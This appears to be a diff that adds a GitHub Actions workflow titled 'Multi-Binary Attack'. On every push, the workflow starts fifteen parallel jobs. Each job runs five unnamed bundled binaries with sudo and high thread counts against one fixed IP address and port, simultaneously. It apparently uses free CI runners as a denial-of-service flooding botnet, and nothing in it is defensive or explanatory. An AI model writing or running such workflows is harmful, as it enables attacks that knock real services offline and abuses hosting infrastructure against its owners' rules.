@@ -1,0 +1,40 @@
+name: Multi-Binary Attack
+
+on: [push]
+
+jobs:
+  multi_attack:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x vishal fuck flame soul soulcracks
+      
+      # ALL BINARIES RUN SIMULTANEOUSLY - NO QUEUE
+      - name: Run ALL 5 Binaries Simultaneously
+        run: |
+          # Start vishal in background
+          sudo ./vishal 91.108.17.55 32001 100 &
+          VISHAL_PID=$!
+          
+          # Start fuck with 1400 threads in background
+          sudo ./fuck 91.108.17.55 32001 100 1400 &
+          FUCK_PID=$!
+          
+          # Start flame in background
+          sudo ./flame 91.108.17.55 32001 100 &
+          FLAME_PID=$!
+          
+          # Start soul with 999 threads in background
+          sudo ./soul 91.108.17.55 32001 100 999 &
+          SOUL_PID=$!
+          
+          # Start soulcracks with 999 threads in background
+          sudo ./soulcracks 91.108.17.55 32001 100 999 &
+          SOULCRACKS_PID=$!
+          
+          # Wait for all processes to complete
+          wait $VISHAL_PID $FUCK_PID $FLAME_PID $SOUL_PID $SOULCRACKS_PID
